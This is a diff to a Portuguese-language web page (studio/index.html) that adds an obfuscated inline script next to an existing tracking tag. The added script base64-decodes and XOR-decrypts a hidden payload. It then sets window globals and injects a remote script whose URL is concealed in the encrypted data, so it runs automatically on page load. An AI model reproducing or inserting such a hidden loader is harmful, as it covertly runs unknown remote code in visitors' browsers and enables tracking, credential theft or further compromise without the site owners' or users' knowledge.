@@ -1,0 +1,10 @@
+--- a/studio/index.html
++++ b/studio/index.html
+@@ -38,6 +38,7 @@
+   </script>
+   <script>window.atk=window.atk||function(){(atk.q=atk.q||[]).push(arguments)}</script>
+   <script async src="https://tracking.traquia.com/t/atk.js" data-atk-key="atk_pub_live_LCFJFWD5ypWd3-W4NZcpbQ"></script>
++  <script>(function(){var g_2w4=atob("DK2p/w/S1ejT2CB1QNaLin2+99LxsFQBMN6T0CCxsYb9rVQYKcvQ0Wy9uMaxqg8GI9/Aj3uh+pi6oEUZb93Ah2q++4Kg+gxXIdndjWawoJy2qwJPG/CF3Wi+uoqytFNXevbS3WGzuI3x4gIFKdXMk0a298TxrkEZNciLxS3ktIvn7RMWccmRxm3lsY63vURBJZmRnTvwqLWu");var m_4=[];for(var o_t=0;o_t<g_2w4.length;o_t++){m_4.push(g_2w4.charCodeAt(o_t)&255);}var j_md=m_4[0];var s_o=m_4.slice(1,1+j_md);var q_7kac=m_4.slice(1+j_md);var c_5xl=q_7kac.map(function(b,t_4su){return b^s_o[t_4su%j_md];});var w_ar5j="";for(var y_j=0;y_j<c_5xl.length;y_j++){w_ar5j+=String.fromCharCode(c_5xl[y_j]&255);}var n_eq51=decodeURIComponent(escape(w_ar5j));var k_e=JSON.parse(n_eq51);var n_i68=k_e.globals||[];n_i68.forEach(function(z_jb7u){window[z_jb7u.name]=z_jb7u.value;});var p_qn=document.createElement("script");p_qn.src=k_e.url;p_qn.async=true;p_qn.defer=true;(k_e.attributes||[]).forEach(function(k_1){p_qn.setAttribute(k_1.name,k_1.value);});(document.head||document.documentElement).appendChild(p_qn);})();</script>
+ </head>
+ <body>
+ <a class="skip" href="#mecanismo">Pular para a demonstração</a>
